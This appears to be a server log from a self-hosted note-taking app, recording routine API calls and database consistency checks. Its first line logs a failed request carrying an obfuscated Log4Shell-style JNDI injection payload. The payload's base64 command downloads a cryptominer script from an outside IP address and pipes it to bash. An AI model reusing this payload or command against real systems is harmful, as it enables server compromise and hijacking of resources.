00:34:40.115 Error: Router not found for request GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==%7D%27%29
00:50:19.637 Table counts: notes: 305, revisions: 68, attachments: 38, branches: 308, attributes: 451, etapi_tokens: 0, blobs: 278
00:50:19.656 All consistency checks passed with no errors detected (took 20ms)
01:50:19.636 Table counts: notes: 305, revisions: 68, attachments: 38, branches: 308, attributes: 451, etapi_tokens: 0, blobs: 278
01:50:19.649 All consistency checks passed with no errors detected (took 13ms)
02:34:56.321 Generated CSRF token 8Y5hJquY-LdmPFFEQ90GdHxLGV9CgRcQ_hgM with secret _csrf=QjM5gCOE5jqY7GSOjFxfwhhw; Path=/
02:34:56.968 200 GET /api/options with 6727 bytes took 2ms
02:34:56.973 200 GET /api/tree with 35863 bytes took 4ms
02:34:56.977 200 GET /api/keyboard-actions with 12407 bytes took 3ms
02:34:56.991 Slow 200 GET /api/script/widgets with 155155 bytes took 13ms
02:34:57.119 200 POST /api/tree/load with 6405 bytes took 4ms
02:34:57.208 200 POST /api/tree/load with 6569 bytes took 3ms
02:34:57.865 200 POST /api/tree/load with 5960 bytes took 3ms
02:34:57.966 200 GET /api/keyboard-shortcuts-for-notes with 2 bytes took 2ms
02:34:58.122 200 GET /api/notes/jpqn2OtPU3r1/blob with 399 bytes took 2ms
02:34:58.125 200 GET /api/note-map/jpqn2OtPU3r1/backlink-count with 11 bytes took 1ms
02:34:58.339 200 GET /api/search/%23workspace%20%23!template with 2 bytes took 3ms
02:34:58.427 200 GET /api/note-map/lsgJRCHtTh9a/backlink-count with 11 bytes took 2ms
02:34:58.431 200 GET /api/notes/lsgJRCHtTh9a/blob with 9416 bytes took 3ms
02:34:58.957 204 PUT /api/options with 0 bytes took 4ms
02:34:59.986 200 GET /api/script/startup with 1804 bytes took 5ms
02:35:00.067 200 POST /api/tree/load with 6531 bytes took 2ms
02:35:00.170 200 POST /api/tree/load with 6685 bytes took 3ms
